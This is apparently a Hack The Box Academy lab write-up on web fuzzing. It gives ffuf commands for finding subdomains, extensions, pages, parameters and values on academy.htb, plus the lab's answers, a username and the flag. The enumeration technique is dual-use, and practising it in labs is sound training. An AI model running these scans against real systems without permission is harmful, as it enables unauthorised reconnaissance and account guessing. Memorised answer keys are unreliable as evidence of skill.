1. Run a sub-domain/vhost fuzzing scan on '\*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name)
```bash
> ffuf -w `fzf-wordlists` -u http://academy.htb:36361/ -H 'Host: FUZZ.academy.htb'  -fs 985
archive, test, faculty
```

2. Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?
```bash
> ffuf -w `fzf-wordlists` -u 'http://academy.htb:36361/indexFUZZ' -fs 279
Do it for each subdomains
php, phps, php7
```

3.  One of the pages you will identify should say 'You don't have access!'. What is the full page URL?
```bash
> ffuf -w `fzf-wordlists` -u 'http://faculty.academy.htb:36361/courses/FUZZ.php7'   -ic -t 30

```

4.  In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?
```bash
>  ffuf -w `fzf-wordlists` -u http://faculty.academy.htb:36361/courses/linux-security.php7\?FUZZ\=key -fs 774

AND

> ffuf -w `fzf-wordlists` -u http://faculty.academy.htb:36361/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'  -fs 774

user, username
```

5. Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?

```bash
> ffuf -w `fzf-wordlists` -u http://faculty.academy.htb:36361/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'  -fs 781

harry


> curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=harry" http://faculty.academy.htb:36361/courses/linux-security.php7

HTB{w3b_fuzz1n6_m4573r}
```